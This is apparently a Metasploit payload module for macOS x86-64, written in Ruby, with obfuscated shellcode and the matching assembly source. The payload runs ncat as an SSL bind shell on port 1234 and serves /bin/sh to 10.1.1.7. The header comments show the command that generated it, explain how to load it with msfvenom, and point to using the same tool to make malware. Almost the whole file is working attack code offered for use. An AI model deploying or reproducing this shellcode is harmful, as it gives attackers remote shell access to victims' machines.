require 'msf/core'

=begin 

Programmer = Scourge
Licence    = GPLv3


	This assembly code (see below) and metasploit framwork shellcode was created in a matter of seconds
	This was done using a tool called Rmutate

git clone https://github.com/Radicalware/Malware_Tools
	note: requires 64 bit python3 (will break with any 32 bit version)

Rmutate -ex -s "/usr/local/bin/ncat  -lvp  1234  --ssl  --allow  10.1.1.7  -e  /bin/sh" -osx -b'\x2f' -msf ncat_bind_ssl "ncat bind 10.1.1.7" -p Scourge
	
	after you send your exploit payloads to metasploit you can easily find it

msfvenom -l payloads | grep osx | grep ncat

	then send it to your pwd

Rmutate -gmp osx/x64/ncat_bind_ssl

	For an example of using this as malware instead of exploit payloads (which has much different syntax)

git clone https://github.com/Radicalware/Malware

	note1: If you don't use -jcp on a unix shellcode you must double space between each register
	note2: the reason why some hex code was xor'd and some wasn't was because I used -b'\x2f'
			had I used -o'\x2f\x00' I would have had every register xor'd where 2f or 00 appeard
			look below for assembly code

	please send all bugs to
	Scourge /d\ protonmail /d\ c()m
	Thanks
=end


module MetasploitModule

  CachedSize = 201

  include Msf::Payload::Osx 	
  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'ncat_bind_ssl',
      'Description'   => 'ncat bind 10.1.1.7',
      'Author'        => [ 'Scourge', 'Scourge' ],
      'License'       => 'GPLv3',
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86_64,	
      'Privileged'    => false,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' =>
			"\x48\x31\xff\x48\x31\xf6\x48\xf7\xe7\x50\x48\xb8\xfa\x91\xcb\x95" +
			"\x46\xf5\x21\x5e\x48\xbb\xd5\xf3\xa2\xfb\x69\xda\x52\x36\x48\x31" +
			"\xd8\x50\x48\x89\xe1\x52\x66\x68\x2d\x65\x49\x89\xe0\x52\x48\xb8" +
			"\x31\x30\x2e\x31\x2e\x31\x2e\x37\x50\x49\x89\xe1\x52\x68\x2d\x2d" +
			"\x61\x6c\xc6\x44\x24\x04\x6c\x66\xc7\x44\x24\x05\x6f\x77\x49\x89" +
			"\xe2\x52\x68\x2d\x2d\x73\x73\xc6\x44\x24\x04\x6c\x49\x89\xe3\x52" +
			"\x68\x31\x32\x33\x34\x49\x89\xe4\x52\x68\x2d\x6c\x76\x70\x49\x89" +
			"\xe5\x52\x68\x6e\x63\x61\x74\x48\xb8\x20\x87\xd5\x7e\xf4\x57\x6e" +
			"\x93\x48\xbb\x41\xeb\xfa\x1c\x9d\x39\x41\xbc\x48\x31\xd8\x50\x48" +
			"\xb8\xed\x9c\x8d\x63\x57\x0b\xfd\xbb\x48\xbb\xc2\xe9\xfe\x11\x78" +
			"\x67\x92\xd8\x48\x31\xd8\x50\x48\x89\xe7\x52\x51\x41\x50\x41\x51" +
			"\x41\x52\x41\x53\x41\x54\x41\x55\x57\x48\x89\xe6\x48\x31\xc0\xb0" +
			"\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05"
			
        }
      ))
  end
end

=begin 

global start
section .text
start:

; Author  : Scourge
; Licence : GPLv3
; Crafted via Rmutate by Scourge

xor  rdi, rdi
xor  rsi, rsi
mul  rdi
push rax


; -------------------------------

; >>>>>>> hs//nib/

mov  rax, 0xef539bc120d3c59e
mov  rbx, 0x8720b4ee4ebaa7b1
xor  rax, rbx
push rax
mov  rcx, rsp
push rdx

; -------------------------------

; >>>>>>> e-


push  word 0x652d
mov  r8 , rsp
push rdx

; -------------------------------

; >>>>>>> 7.1.1.01

mov  rax, 0x372e312e312e3031
push rax
mov  r9 , rsp
push rdx

; -------------------------------

; >>>>>>> wolla--

push dword 0x6c612d2d
mov  byte [rsp+4], 0x6c
mov  word [rsp+5], 0x776f
mov  r10, rsp
push rdx

; -------------------------------

; >>>>>>> lss--

push dword 0x73732d2d
mov  byte [rsp+4], 0x6c
mov  r11, rsp
push rdx

; -------------------------------

; >>>>>>> 4321


push 0x34333231
mov  r12, rsp
push rdx

; -------------------------------

; >>>>>>> pvl-


push 0x70766c2d
mov  r13, rsp
push rdx

; -------------------------------

; >>>>>>> tacn


push 0x7461636e


; >>>>>>> //nib/la

mov  rax, 0x3a60c14769ac78cd
mov  rbx, 0x154faf2e0b8314ac
xor  rax, rbx
push rax


; >>>>>>> col/rsu/

mov  rax, 0x1beffe13bd240167
mov  rbx, 0x7880923ccf577448
xor  rax, rbx
push rax
mov  rdi, rsp
push rdx

; -------------------------------

push rcx
push r8 
push r9 
push r10
push r11
push r12
push r13
push rdi
mov  rsi, rsp


xor  rax, rax
mov  al,  0x02
ror  rax, 0x28
mov  al,  0x3b
syscall

; that's all

=end
		
